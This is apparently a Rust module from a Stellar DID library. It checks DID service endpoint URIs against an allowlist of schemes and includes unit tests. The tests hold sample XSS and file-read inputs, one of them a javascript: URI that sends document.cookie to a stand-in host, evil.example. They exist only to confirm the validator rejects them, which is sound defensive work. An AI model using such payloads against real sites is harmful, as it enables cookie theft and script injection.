//! DID service endpoint management (issue #343).
//!
//! A DID document's `service` array lists endpoints that can be used to
//! interact with the DID subject. Each endpoint carries a URI that may be
//! dereferenced by resolvers and wallets, so allowing arbitrary URI schemes
//! would let a malicious document embed `javascript:`, `data:`, or `file:`
//! URIs that execute code or leak local files when rendered.
//!
//! This module enforces an **allowlist of safe URI schemes** at construction
//! time. A [`ServiceEndpoint`] value can only be created from an accepted URI,
//! which means the validation invariant is upheld everywhere the type appears —
//! including inside [`DidDocument::add_service`] before publication.
//!
//! # Allowed schemes
//!
//! | Scheme   | Rationale                                                        |
//! |----------|------------------------------------------------------------------|
//! | `https`  | Standard secure web endpoint                                     |
//! | `http`   | Permitted for local/testnet development; warn in production use  |
//! | `did`    | DID URLs (`did:stellar:...`) are valid service endpoint values   |
//!
//! All other schemes — including `javascript`, `data`, `file`, `vbscript`,
//! `blob`, `about`, and anything unknown — are rejected with
//! [`DidError::InvalidScheme`].
//!
//! # Examples
//!
//! ```rust
//! use stellar_did::service::{ServiceEndpoint, DidError};
//!
//! // Accepted schemes
//! assert!(ServiceEndpoint::uri("https://hub.example.com").is_ok());
//! assert!(ServiceEndpoint::uri("http://localhost:8080/endpoint").is_ok());
//! assert!(ServiceEndpoint::uri("did:stellar:testnet:GABC#linked-domain").is_ok());
//!
//! // Rejected schemes
//! assert!(matches!(
//!     ServiceEndpoint::uri("javascript:alert(1)"),
//!     Err(DidError::InvalidScheme { .. })
//! ));
//! assert!(matches!(
//!     ServiceEndpoint::uri("data:text/html,<script>alert(1)</script>"),
//!     Err(DidError::InvalidScheme { .. })
//! ));
//! ```

use serde::{Deserialize, Serialize};
use std::collections::HashMap;
use thiserror::Error;

// ── Errors ───────────────────────────────────────────────────────────────────

/// Errors that can occur in DID document and service endpoint operations.
#[derive(Error, Debug, Clone, PartialEq, Eq)]
pub enum DidError {
    /// The URI could not be parsed.
    ///
    /// The `input` field is included so the caller gets an actionable message
    /// without having to re-format the input themselves.
    #[error("invalid URI `{input}`: {reason}")]
    InvalidUri { input: String, reason: String },

    /// The URI's scheme is not in the allowlist.
    ///
    /// `scheme` is the scheme that was rejected (e.g. `"javascript"`), and
    /// `uri` is the full URI so the operator can find it in their document.
    #[error(
        "URI scheme `{scheme}` is not permitted for service endpoints \
         (allowed: https, http, did); rejecting `{uri}`"
    )]
    InvalidScheme { scheme: String, uri: String },

    /// A DID document already contains a service with this ID.
    #[error("service `{0}` is already registered in this DID document")]
    DuplicateServiceId(String),

    /// The service ID is empty or blank.
    #[error("service id must not be empty")]
    EmptyServiceId,

    /// The service type is empty or blank.
    #[error("service type must not be empty")]
    EmptyServiceType,
}

// ── Scheme allowlist ─────────────────────────────────────────────────────────

/// URI schemes that are safe to use as DID service endpoints.
///
/// Schemes not in this list are rejected by [`ServiceEndpoint::uri`].
/// The list is kept intentionally narrow: adding a scheme here is a security
/// decision that must be made deliberately.
const ALLOWED_SCHEMES: &[&str] = &["https", "http", "did"];

/// Returns `true` when `scheme` is in the service-endpoint allowlist.
#[inline]
fn is_scheme_allowed(scheme: &str) -> bool {
    ALLOWED_SCHEMES.contains(&scheme)
}

// ── ServiceEndpoint ───────────────────────────────────────────────────────────

/// A validated URI used as a DID service endpoint.
///
/// A `ServiceEndpoint` value is proof that the scheme was checked at
/// construction time — it is impossible to construct one with a disallowed
/// scheme through the public API.
///
/// Serialises as a plain JSON string (the URI), matching the W3C DID Core
/// representation for single-URI service endpoints.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
pub struct ServiceEndpoint(String);

impl ServiceEndpoint {
    /// Construct a `ServiceEndpoint` from a URI string.
    ///
    /// # Errors
    ///
    /// Returns [`DidError::InvalidUri`] when the input cannot be parsed as an
    /// absolute URI, and [`DidError::InvalidScheme`] when the scheme is not in
    /// the allowlist (`https`, `http`, `did`).
    pub fn uri(input: impl Into<String>) -> Result<Self, DidError> {
        let raw = input.into();

        // Use the `url` crate for normalization and scheme extraction.
        // `did:` URIs are parsed by the url crate with scheme "did", which is
        // exactly what we need for the allowlist check.
        let parsed = url::Url::parse(&raw).map_err(|e| DidError::InvalidUri {
            input: raw.clone(),
            reason: e.to_string(),
        })?;

        let scheme = parsed.scheme();
        if !is_scheme_allowed(scheme) {
            return Err(DidError::InvalidScheme {
                scheme: scheme.to_string(),
                uri: raw,
            });
        }

        Ok(ServiceEndpoint(raw))
    }

    /// The underlying URI string.
    #[must_use]
    pub fn as_str(&self) -> &str {
        &self.0
    }
}

impl std::fmt::Display for ServiceEndpoint {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        f.write_str(&self.0)
    }
}

// ── Service ───────────────────────────────────────────────────────────────────

/// A single entry in the `service` array of a DID document.
///
/// Corresponds to the [W3C DID Core service](https://www.w3.org/TR/did-core/#services)
/// definition. The `service_endpoint` field uses [`ServiceEndpoint`], so the
/// scheme is validated before the service can be constructed.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
pub struct Service {
    /// The service's DID URL identifier (e.g. `did:stellar:testnet:GABC#hub`).
    pub id: String,
    /// Type string identifying the service protocol (e.g. `"IdentityHub"`).
    pub service_type: String,
    /// The endpoint URI, validated at construction time.
    pub service_endpoint: ServiceEndpoint,
    /// Optional additional properties defined by the service specification.
    #[serde(default, skip_serializing_if = "HashMap::is_empty")]
    pub properties: HashMap<String, serde_json::Value>,
}

impl Service {
    /// Create a new service entry.
    ///
    /// # Errors
    ///
    /// Returns [`DidError::EmptyServiceId`] when `id` is blank, and
    /// [`DidError::EmptyServiceType`] when `service_type` is blank.
    /// Any error from constructing the endpoint is propagated unchanged.
    pub fn new(
        id: impl Into<String>,
        service_type: impl Into<String>,
        endpoint: ServiceEndpoint,
    ) -> Result<Self, DidError> {
        let id = id.into();
        if id.trim().is_empty() {
            return Err(DidError::EmptyServiceId);
        }
        let service_type = service_type.into();
        if service_type.trim().is_empty() {
            return Err(DidError::EmptyServiceType);
        }
        Ok(Service {
            id,
            service_type,
            service_endpoint: endpoint,
            properties: HashMap::new(),
        })
    }
}

// ── DidDocument ───────────────────────────────────────────────────────────────

/// A minimal DID document that holds the service array.
///
/// The service array is the publication surface for which scheme validation
/// matters: `add_service` re-validates on every insertion as defense-in-depth,
/// and it enforces uniqueness of service IDs so that a repeated ID cannot be
/// used to shadow a legitimate entry.
#[derive(Debug, Clone, Default, Serialize, Deserialize)]
pub struct DidDocument {
    /// DID subject identifier.
    pub id: String,
    /// Service endpoints registered in this document.
    #[serde(default)]
    pub service: Vec<Service>,
}

impl DidDocument {
    /// Create an empty DID document for the given subject `id`.
    #[must_use]
    pub fn new(id: impl Into<String>) -> Self {
        DidDocument {
            id: id.into(),
            service: Vec::new(),
        }
    }

    /// Add a service to the document, validating the endpoint scheme.
    ///
    /// This is the **pre-publication gate**: a service cannot be added (and
    /// therefore published) unless its endpoint passes scheme validation.
    ///
    /// # Errors
    ///
    /// * [`DidError::InvalidScheme`] — the endpoint URI carries a disallowed
    ///   scheme (e.g. `javascript:`, `data:`, `file:`). The document is left
    ///   unchanged.
    /// * [`DidError::DuplicateServiceId`] — a service with the same `id` is
    ///   already registered. The document is left unchanged.
    pub fn add_service(&mut self, service: Service) -> Result<(), DidError> {
        // Re-validate the scheme as defense-in-depth.  A ServiceEndpoint
        // constructed through the public API is already valid, but a document
        // deserialized from untrusted JSON could carry any string.
        let parsed = url::Url::parse(service.service_endpoint.as_str()).map_err(|e| {
            DidError::InvalidUri {
                input: service.service_endpoint.as_str().to_string(),
                reason: e.to_string(),
            }
        })?;
        let scheme = parsed.scheme();
        if !is_scheme_allowed(scheme) {
            return Err(DidError::InvalidScheme {
                scheme: scheme.to_string(),
                uri: service.service_endpoint.as_str().to_string(),
            });
        }

        // Reject duplicate IDs: a second entry with the same ID cannot shadow
        // the first without the caller explicitly removing the original.
        if self.service.iter().any(|s| s.id == service.id) {
            return Err(DidError::DuplicateServiceId(service.id));
        }

        self.service.push(service);
        Ok(())
    }

    /// Remove a service by its ID, returning `true` when one was removed.
    pub fn remove_service(&mut self, id: &str) -> bool {
        let before = self.service.len();
        self.service.retain(|s| s.id != id);
        self.service.len() < before
    }

    /// Look up a service by ID.
    #[must_use]
    pub fn get_service(&self, id: &str) -> Option<&Service> {
        self.service.iter().find(|s| s.id == id)
    }
}

// ── Tests ─────────────────────────────────────────────────────────────────────

#[cfg(test)]
mod tests {
    use super::*;

    // ── ServiceEndpoint::uri — normal (allowed) schemes ──────────────────────

    #[test]
    fn https_scheme_is_accepted() {
        let ep = ServiceEndpoint::uri("https://hub.example.com").unwrap();
        assert_eq!(ep.as_str(), "https://hub.example.com");
    }

    #[test]
    fn https_with_path_and_query_is_accepted() {
        let uri = "https://identity.foundation/v1/hub?format=json";
        assert!(ServiceEndpoint::uri(uri).is_ok());
    }

    #[test]
    fn http_scheme_is_accepted() {
        // http is allowed for testnet / local development.
        assert!(ServiceEndpoint::uri("http://localhost:8080/endpoint").is_ok());
    }

    #[test]
    fn did_scheme_is_accepted() {
        // A DID URL is a valid service endpoint per DID Core.
        let ep = ServiceEndpoint::uri("did:stellar:testnet:GABC#linked-domain");
        assert!(ep.is_ok(), "did: scheme must be accepted, got: {ep:?}");
    }

    #[test]
    fn did_url_without_fragment_is_accepted() {
        assert!(ServiceEndpoint::uri("did:example:123abc").is_ok());
    }

    // ── ServiceEndpoint::uri — rejected (disallowed) schemes ─────────────────

    #[test]
    fn javascript_scheme_is_rejected() {
        let err = ServiceEndpoint::uri("javascript:alert(1)").unwrap_err();
        assert!(
            matches!(err, DidError::InvalidScheme { ref scheme, .. } if scheme == "javascript"),
            "unexpected error: {err:?}"
        );
    }

    #[test]
    fn data_scheme_is_rejected() {
        let err = ServiceEndpoint::uri("data:text/html,<script>alert(1)</script>").unwrap_err();
        assert!(
            matches!(err, DidError::InvalidScheme { ref scheme, .. } if scheme == "data"),
            "unexpected error: {err:?}"
        );
    }

    #[test]
    fn file_scheme_is_rejected() {
        let err = ServiceEndpoint::uri("file:///etc/passwd").unwrap_err();
        assert!(
            matches!(err, DidError::InvalidScheme { ref scheme, .. } if scheme == "file"),
            "unexpected error: {err:?}"
        );
    }

    #[test]
    fn ftp_scheme_is_rejected() {
        let err = ServiceEndpoint::uri("ftp://files.example.com/pub").unwrap_err();
        assert!(
            matches!(err, DidError::InvalidScheme { ref scheme, .. } if scheme == "ftp"),
            "unexpected error: {err:?}"
        );
    }

    #[test]
    fn mailto_scheme_is_rejected() {
        let err = ServiceEndpoint::uri("mailto:admin@example.com").unwrap_err();
        assert!(
            matches!(err, DidError::InvalidScheme { .. }),
            "unexpected error: {err:?}"
        );
    }

    #[test]
    fn blob_scheme_is_rejected() {
        let err = ServiceEndpoint::uri("blob:https://example.com/uuid").unwrap_err();
        assert!(
            matches!(err, DidError::InvalidScheme { ref scheme, .. } if scheme == "blob"),
            "unexpected error: {err:?}"
        );
    }

    // ── Boundary: malformed URIs ──────────────────────────────────────────────

    #[test]
    fn empty_string_is_rejected_as_invalid_uri() {
        let err = ServiceEndpoint::uri("").unwrap_err();
        assert!(
            matches!(err, DidError::InvalidUri { .. }),
            "empty string should be an invalid URI, got: {err:?}"
        );
    }

    #[test]
    fn relative_uri_without_scheme_is_rejected() {
        // A relative path like "/endpoint" has no scheme.
        let err = ServiceEndpoint::uri("/endpoint/v1").unwrap_err();
        assert!(
            matches!(err, DidError::InvalidUri { .. }),
            "relative URI should be rejected, got: {err:?}"
        );
    }

    #[test]
    fn scheme_only_with_no_body_is_handled() {
        // "javascript:" with no path parses but scheme is not allowed.
        let err = ServiceEndpoint::uri("javascript:").unwrap_err();
        assert!(
            matches!(err, DidError::InvalidScheme { .. }),
            "bare scheme must still be rejected: {err:?}"
        );
    }

    // ── Error message quality ─────────────────────────────────────────────────

    #[test]
    fn invalid_scheme_error_names_the_scheme_and_full_uri() {
        let uri = "javascript:alert(document.cookie)";
        let err = ServiceEndpoint::uri(uri).unwrap_err();
        let msg = err.to_string();
        assert!(
            msg.contains("javascript"),
            "error must name the rejected scheme, got: {msg}"
        );
        assert!(
            msg.contains(uri),
            "error must include the full URI, got: {msg}"
        );
    }

    // ── DidDocument::add_service ──────────────────────────────────────────────

    fn make_service(id: &str, endpoint_uri: &str) -> Service {
        let ep = ServiceEndpoint::uri(endpoint_uri).expect("valid endpoint in test helper");
        Service::new(id, "LinkedDomains", ep).expect("valid service in test helper")
    }

    #[test]
    fn add_service_with_https_endpoint_succeeds() {
        let mut doc = DidDocument::new("did:stellar:testnet:GABC");
        let svc = make_service("did:stellar:testnet:GABC#hub", "https://hub.example.com");
        assert!(doc.add_service(svc).is_ok());
        assert_eq!(doc.service.len(), 1);
    }

    #[test]
    fn add_service_rejects_disallowed_scheme_and_leaves_document_unchanged() {
        let mut doc = DidDocument::new("did:stellar:testnet:GABC");

        // Manually build a Service with a bad endpoint (bypass the constructor
        // by using the Deserialize path via JSON — but since ServiceEndpoint
        // stores a plain String, deserialization does not validate; that is the
        // defence-in-depth path we are testing here).
        // The `String` field is private, but deserialization does not validate,
        // so a JSON round-trip crafts an endpoint that bypassed the constructor.
        let bad_ep: ServiceEndpoint =
            serde_json::from_value(serde_json::json!("javascript:alert(1)")).expect("deserialize");
        let svc = Service {
            id: "did:stellar:testnet:GABC#bad".to_string(),
            service_type: "Malicious".to_string(),
            service_endpoint: bad_ep,
            properties: HashMap::new(),
        };

        let err = doc.add_service(svc).unwrap_err();
        assert!(
            matches!(err, DidError::InvalidScheme { .. }),
            "add_service must reject bad scheme: {err:?}"
        );
        assert_eq!(
            doc.service.len(),
            0,
            "document must be unchanged after a rejected add_service"
        );
    }

    #[test]
    fn add_service_rejects_duplicate_id() {
        let mut doc = DidDocument::new("did:stellar:testnet:GABC");
        let svc1 = make_service("did:stellar:testnet:GABC#hub", "https://hub.example.com");
        let svc2 = make_service("did:stellar:testnet:GABC#hub", "https://other.example.com");

        doc.add_service(svc1).unwrap();
        let err = doc.add_service(svc2).unwrap_err();
        assert!(
            matches!(err, DidError::DuplicateServiceId(_)),
            "duplicate id must be rejected: {err:?}"
        );
        assert_eq!(doc.service.len(), 1, "only the first service must remain");
    }

    #[test]
    fn multiple_different_services_are_accepted() {
        let mut doc = DidDocument::new("did:stellar:testnet:GABC");
        doc.add_service(make_service(
            "did:stellar:testnet:GABC#hub",
            "https://hub.example.com",
        ))
        .unwrap();
        doc.add_service(make_service(
            "did:stellar:testnet:GABC#messaging",
            "https://messaging.example.com",
        ))
        .unwrap();
        assert_eq!(doc.service.len(), 2);
    }

    // ── DID document serialization ────────────────────────────────────────────

    #[test]
    fn service_endpoint_serialises_as_plain_string() {
        let ep = ServiceEndpoint::uri("https://hub.example.com").unwrap();
        let json = serde_json::to_string(&ep).unwrap();
        assert_eq!(json, r#""https://hub.example.com""#);
    }

    #[test]
    fn did_document_serialises_to_expected_shape() {
        let mut doc = DidDocument::new("did:stellar:testnet:GABC");
        doc.add_service(make_service(
            "did:stellar:testnet:GABC#hub",
            "https://hub.example.com",
        ))
        .unwrap();

        let value: serde_json::Value = serde_json::to_value(&doc).unwrap();
        assert_eq!(value["id"].as_str(), Some("did:stellar:testnet:GABC"));
        assert_eq!(
            value["service"][0]["service_endpoint"].as_str(),
            Some("https://hub.example.com")
        );
        assert_eq!(
            value["service"][0]["service_type"].as_str(),
            Some("LinkedDomains")
        );
    }

    // ── Integration: full document publication workflow ───────────────────────

    #[test]
    fn full_publication_workflow_accepts_valid_services() {
        // Mirrors the crates/README.md example usage.
        let mut document = DidDocument::new("did:stellar:testnet:GABC");

        let ep = ServiceEndpoint::uri("https://hub.example.com").unwrap();
        let service = Service::new("did:stellar:testnet:GABC#hub", "IdentityHub", ep).unwrap();
        document.add_service(service).unwrap();

        // Document is non-empty and the endpoint is accessible.
        assert_eq!(document.service.len(), 1);
        assert_eq!(
            document.service[0].service_endpoint.as_str(),
            "https://hub.example.com"
        );

        // The document round-trips through JSON without error.
        let json = serde_json::to_string(&document).unwrap();
        let restored: DidDocument = serde_json::from_str(&json).unwrap();
        assert_eq!(
            restored.service[0].service_endpoint.as_str(),
            "https://hub.example.com"
        );
    }

    #[test]
    fn full_publication_workflow_rejects_dangerous_endpoint_before_publication() {
        // A document that attempts to add a dangerous endpoint must fail
        // before the service is committed to the document.
        let document = DidDocument::new("did:stellar:testnet:GABC");

        // This endpoint would be dangerous in a browser-rendered resolver UI.
        let err = ServiceEndpoint::uri(
            "javascript:void(document.location='http://evil.example/steal?c='+document.cookie)",
        )
        .unwrap_err();
        assert!(matches!(err, DidError::InvalidScheme { .. }));

        // The document was never modified.
        assert!(document.service.is_empty());
    }
}
